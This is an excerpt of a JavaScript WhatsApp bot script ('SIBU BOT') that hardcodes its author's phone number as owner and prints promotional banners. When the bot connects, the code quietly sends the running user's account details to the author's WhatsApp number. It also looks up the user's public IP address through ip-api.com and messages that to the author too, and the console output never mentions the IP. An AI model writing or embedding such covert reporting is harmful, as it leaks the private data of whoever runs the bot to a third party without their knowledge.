...
const gcrevoke = ["919337956084-1621430788@g.us"]
prefix = '#'
shp = '⬡'
owner = "919337956084@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["Subscribe 𝐒𝐢𝐛𝐮", "Chrome", "3.0"];
  ...
  client.on("qr", () => {
    console.log(
      ...
      client.sendMessage(`919337956084@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
  ...
  client.on("open", () => {
    success("2", "Successfully connected to wa, Subscribe 𝐒𝐢𝐛𝐮");
console.log(color(figlet.textSync(`${spc1}            SIBU BOT`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝙄 𝙬𝙧𝙤𝙩𝙚 𝙩𝙝𝙞𝙨 𝙨𝙘𝙧𝙞𝙥𝙩 𝙢𝙮𝙨𝙚𝙡𝙛!\n𝙉𝙤𝙩𝙚: 𝘿𝙤𝙣𝙩 𝙛𝙤𝙧𝙜𝙚𝙩 𝙩𝙤 𝙨𝙪𝙗𝙨𝙘𝙧𝙞𝙗𝙚 𝐒𝐢𝐛𝐮', 'yellow'))
    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/919337956084'))
    console.log(color('[SIBU BOT]'), color('𝐒𝐢𝐛𝐮 𝐁𝐨𝐭 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`919337956084@s.whatsapp.net`, `*Hi Owner 𝐒𝐢𝐛𝐮, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝐒𝐢𝐛𝐮 Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Sibu.jpg'),sourceUrl:"https://wa.me/919337956084?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("919337956084@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝐒𝐢𝐛𝐮 Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Sibu.jpg'),sourceUrl:"https://wa.me/919337956084?text=Hello bro"}}})
...
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '919337956084-1604595598@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'𝐒𝐢𝐛𝐮',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;𝐒𝐢𝐛𝐮;;;\nFN:resku\nitem1.TEL;waid=919337956084:+91 690-9137-213\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
  ...
  client.on("group-participants-update", async (anu) => {
    try {
      ...
      if (anu.action == "add" && mem.includes(client.user.jid)) {
        client.sendMessage(anu.jid, "Hello everyone, am SIBU BOT, ready to help you here ㋛︎", "conversation");
      }
